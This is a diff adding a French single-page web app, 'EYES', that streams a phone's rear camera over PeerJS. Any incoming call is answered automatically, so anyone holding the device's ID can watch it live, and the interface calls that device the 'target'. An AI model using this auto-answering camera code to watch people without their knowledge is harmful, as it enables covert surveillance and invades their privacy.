@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#121212">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>👁️ EYES — Caméra P2P</title>
+    <link rel="manifest" href="manifest.json">
+    <script src="https://cdn.jsdelivr.net/npm/peerjs@1.5.4/dist/peerjs.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+        body { background: #121212; color: #fff; min-height: 100vh; padding: 20px; }
+        .container { max-width: 500px; margin: 0 auto; }
+        h1 { text-align: center; font-size: 28px; margin-bottom: 5px; }
+        .my-id { background: #1e3a1e; border: 1px solid #4CAF50; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: center; }
+        .my-id h2 { font-size: 14px; color: #aaa; margin-bottom: 5px; }
+        .my-id .id { font-size: 22px; font-weight: bold; color: #4CAF50; font-family: monospace; }
+        .box { background: #1e1e1e; border-radius: 12px; padding: 20px; margin-bottom: 15px; }
+        label { display: block; font-size: 14px; color: #ccc; margin-bottom: 8px; }
+        input { width: 100%; padding: 14px; background: #2a2a2a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 16px; text-align: center; }
+        input:focus { outline: none; border-color: #2196F3; }
+        button { width: 100%; padding: 16px; border: none; border-radius: 10px; font-size: 17px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-bottom: 10px; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-connect { background: #2196F3; color: #fff; }
+        .btn-connect:hover { background: #1976D2; }
+        .btn-disconnect { background: #E91E63; color: #fff; }
+        .btn-disconnect:hover { background: #C2185B; }
+        .status { text-align: center; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 15px; }
+        .status.waiting { background: #2a2a2a; color: #aaa; }
+        .status.connected { background: #1e3a1e; color: #4CAF50; }
+        .video-container { width: 100%; background: #1a1a1a; border-radius: 12px; overflow: hidden; margin-top: 10px; }
+        video { width: 100%; height: auto; display: block; background: #000; }
+        .local-video { position: fixed; top: 10px; right: 10px; width: 120px; border-radius: 8px; border: 2px solid #4CAF50; z-index: 100; }
+        .hint { text-align: center; font-size: 12px; color: #666; margin-top: 20px; }
+        .copy-btn { background: #4CAF50; color: white; padding: 6px 12px; font-size: 12px; width: auto; margin-top: 8px; border-radius: 6px; }
+        .install-banner { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #2196F3; color: white; padding: 12px 24px; border-radius: 50px; z-index: 200; display: none; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        .install-banner button { width: auto; padding: 8px 16px; margin: 0 0 0 10px; background: white; color: #2196F3; border-radius: 6px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>👁️ EYES</h1>
+        
+        <div class="my-id">
+            <h2>TON ID UNIQUE</h2>
+            <div class="id" id="myId">---- ----</div>
+            <button class="copy-btn" onclick="copyMyId()">📋 Copier</button>
+        </div>
+
+        <div class="box">
+            <label>🔗 ID DE LA CIBLE</label>
+            <input type="text" id="targetId" placeholder="ex: ABCD-1234">
+            
+            <button class="btn-connect" id="connectBtn" onclick="connectToTarget()">▶️ VOIR EN DIRECT</button>
+            <button class="btn-disconnect" id="disconnectBtn" onclick="disconnect()" disabled>⏹️ ARRÊTER</button>
+            
+            <div class="status waiting" id="status">⏳ En attente de connexion...</div>
+        </div>
+
+        <div class="video-container" id="videoContainer" style="display: none;">
+            <video id="remoteVideo" autoplay playsinline></video>
+        </div>
+
+        <video id="localVideo" autoplay playsinline muted class="local-video" style="display: none;"></video>
+
+        <p class="hint">🔒 Connexion directe P2P — La caméra ne s'allume que du côté cible</p>
+    </div>
+
+    <div class="install-banner" id="installBanner">
+        📱 Installe EYES sur ton téléphone !
+        <button onclick="installApp()">INSTALLER</button>
+        <button style="background: transparent; color: white; border: 1px solid white;" onclick="closeInstallBanner()">✕</button>
+    </div>
+
+    <script>
+        // 📦 Enregistrer Service Worker
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('./service-worker.js')
+                    .then(reg => console.log('✅ Service Worker enregistré'))
+                    .catch(err => console.log('⚠️ SW:', err));
+            });
+        }
+
+        // 📱 Bannière d'installation PWA
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            document.getElementById('installBanner').style.display = 'flex';
+        });
+
+        function installApp() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then(choice => {
+                    deferredPrompt = null;
+                    document.getElementById('installBanner').style.display = 'none';
+                });
+            }
+        }
+        function closeInstallBanner() {
+            document.getElementById('installBanner').style.display = 'none';
+        }
+
+        // 🎯 Générer un ID unique
+        const MY_PEER_ID = generateId();
+        document.getElementById('myId').textContent = MY_PEER_ID;
+
+        // 🔧 Variables globales
+        let peer = null;
+        let localStream = null;
+        let currentCall = null;
+        let isServerMode = false;
+
+        // 📌 Éléments DOM
+        const statusEl = document.getElementById('status');
+        const connectBtn = document.getElementById('connectBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
+        const targetIdInput = document.getElementById('targetId');
+        const remoteVideo = document.getElementById('remoteVideo');
+        const localVideo = document.getElementById('localVideo');
+        const videoContainer = document.getElementById('videoContainer');
+
+        // 🚀 Initialisation de PeerJS
+        function initPeer() {
+            peer = new Peer(MY_PEER_ID, {
+                host: 'peerjs-server.onrender.com',
+                port: 443,
+                path: '/',
+                debug: 2
+            });
+
+            peer.on('open', (id) => {
+                updateStatus('✅ En attente de connexion...', 'waiting');
+                startServerMode();
+            });
+
+            peer.on('call', (call) => {
+                isServerMode = true;
+                answerCall(call);
+            });
+
+            peer.on('error', (err) => {
+                updateStatus('❌ Erreur: ' + err.type, 'waiting');
+            });
+        }
+
+        // 📷 Mode SERVEUR = je partage MA caméra
+        async function startServerMode() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false 
+                });
+                localVideo.srcObject = localStream;
+                localVideo.style.display = 'block';
+            } catch (err) {
+                updateStatus('❌ Autorise la caméra !', 'waiting');
+            }
+        }
+
+        // 📞 Répondre à un appel = envoyer ma vidéo
+        async function answerCall(call) {
+            if (!localStream) return;
+
+            call.answer(localStream);
+
+            call.on('close', () => {
+                updateStatus('✅ En attente de connexion...', 'waiting');
+                disconnectBtn.disabled = true;
+                connectBtn.disabled = false;
+                videoContainer.style.display = 'none';
+                currentCall = null;
+            });
+
+            currentCall = call;
+            updateStatus('📡 Caméra en cours de diffusion...', 'connected');
+            disconnectBtn.disabled = false;
+            connectBtn.disabled = true;
+        }
+
+        // 🔍 Mode CLIENT = je me connecte à une autre caméra
+        async function connectToTarget() {
+            const targetId = targetIdInput.value.trim().toUpperCase();
+            if (!targetId) { alert("⚠️ Entre un ID d'abord !"); return; }
+            if (targetId === MY_PEER_ID) { alert("⚠️ Tu ne peux pas te connecter à toi-même !"); return; }
+
+            updateStatus('🔍 Connexion en cours...', 'waiting');
+            connectBtn.disabled = true;
+            isServerMode = false;
+            localVideo.style.display = 'none';
+
+            try {
+                const call = peer.call(targetId, null);
+                
+                call.on('stream', (remoteStream) => {
+                    remoteVideo.srcObject = remoteStream;
+                    videoContainer.style.display = 'block';
+                    updateStatus(`✅ En direct depuis ${targetId}`, 'connected');
+                });
+
+                call.on('close', () => {
+                    updateStatus('⏹️ Déconnecté', 'waiting');
+                    videoContainer.style.display = 'none';
+                    connectBtn.disabled = false;
+                    disconnectBtn.disabled = true;
+                    currentCall = null;
+                });
+
+                call.on('error', (err) => {
+                    updateStatus('❌ Impossible de se connecter', 'waiting');
+                    connectBtn.disabled = false;
+                });
+
+                currentCall = call;
+                disconnectBtn.disabled = false;
+
+            } catch (err) {
+                updateStatus('❌ ' + err.message, 'waiting');
+                connectBtn.disabled = false;
+            }
+        }
+
+        // ⏹️ Déconnexion
+        function disconnect() {
+            if (currentCall) {
+                currentCall.close();
+                currentCall = null;
+            }
+            videoContainer.style.display = 'none';
+            connectBtn.disabled = false;
+            disconnectBtn.disabled = true;
+            if (!isServerMode) {
+                localVideo.style.display = 'block';
+                updateStatus('✅ En attente de connexion...', 'waiting');
+            }
+        }
+
+        // 📋 Copier mon ID
+        function copyMyId() {
+            navigator.clipboard.writeText(MY_PEER_ID).then(() => alert("✅ ID copié !"));
+        }
+
+        // 🆕 Générer un ID unique
+        function generateId() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            const part1 = Array(4).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+            const part2 = Array(4).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+            return `${part1}-${part2}`;
+        }
+
+        // ✅ Mettre à jour le statut
+        function updateStatus(text, type) {
+            statusEl.textContent = text;
+            statusEl.className = `status ${type}`;
+        }
+
+        // 🚀 Lancer au chargement
+        window.addEventListener('load', initPeer);
+    </script>
+</body>
+</html>
